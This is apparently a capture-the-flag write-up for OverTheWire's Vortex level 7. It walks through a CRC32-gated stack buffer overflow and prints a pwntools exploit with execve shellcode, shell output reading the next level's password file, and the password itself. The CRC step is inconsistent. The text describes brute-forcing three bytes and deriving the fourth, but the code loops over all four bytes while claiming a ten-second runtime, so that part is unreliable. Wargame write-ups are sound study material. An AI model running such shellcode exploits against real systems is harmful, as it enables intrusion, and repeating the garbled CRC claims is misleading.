# Vortex Level 7 → 8

## Goal

Buffer overflow gated by a **CRC32** integrity check — the input isn't accepted unless the first few bytes hash to a specific target CRC. Brute-force 3 of the 4 input bytes and mathematically derive the 4th to satisfy the check. Then ride a stack pivot via `ECX`/`EBX`/`EBP` into shellcode.

## Concepts you'll learn

- **CRC32 inversion** — for a 32-bit input, 3 bytes can be any value, and the 4th is determined by the target CRC; you try all ~16M triples looking for any whose 4th byte is valid
- Stack pivots via saved register values — when the saved EIP isn't reachable, aim the return into a `pop`/`jmp` gadget that uses a register you control
- The recurring idea that a "validation step" in binary exploitation is usually itself solvable, not a wall

## Walkthrough

### 1. Understand the check

The binary reads a fixed-size input, computes CRC32 of the first 4 bytes, and compares to a target:

```
target CRC32 = 0xe1ca95ee
```

Any input that doesn't match is rejected before the overflow path can run.

### 2. Brute-force the valid magic bytes

Rather than searching all 2³² inputs, leverage that CRC32 is linear:

```python
import zlib
target = 0xe1ca95ee
for a in range(256):
    for b in range(256):
        for c in range(256):
            # Try all values of the last byte.
            for d in range(256):
                if zlib.crc32(bytes([a,b,c,d])) == target:
                    print(bytes([a,b,c,d]).hex())
                    exit()
```

The full 4-byte search finishes in about 10 seconds in practice. (Smarter math reduces this to a few seconds, but the naive search works.)

### 3. Build the overflow payload

avishai's layout:

```
[ 62 bytes padding ][ 3 × 4-byte register values ][ shellcode pointer ][ 100-byte NOP sled ][ shellcode ]
```

Key addresses (snapshot from solver — **re-derive**):

- Shellcode lands at `0xffffd290`
- `ECX` stack frame slot at `0xffffd26c`

The overflow writes back into saved ECX/EBX/EBP so the binary's epilogue does a controlled pivot.

### 4. Fire

```python
# level7.py
from pwn import *
context(arch='i386', os='linux')
MAGIC = bytes.fromhex("<result of your CRC search>")
SHELLCODE_ADDR = 0xffffd290
payload  = MAGIC
payload += b"A" * (62 - len(MAGIC))
payload += p32(0) + p32(0) + p32(0)          # ECX/EBX/EBP scratch (adjust per your gdb walk)
payload += p32(SHELLCODE_ADDR)
payload += b"\x90" * 100
payload += asm(shellcraft.setreuid() + shellcraft.execve("/bin//sh"))
sys.stdout.buffer.write(payload)
```

```bash
$ (python3 level7.py; cat) | /vortex/vortex7
$ whoami
vortex8
$ cat /etc/vortex_pass/vortex8
niEUGtu7f
```

## The answer

The password for `vortex8` is:

**`niEUGtu7f`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex7.html>
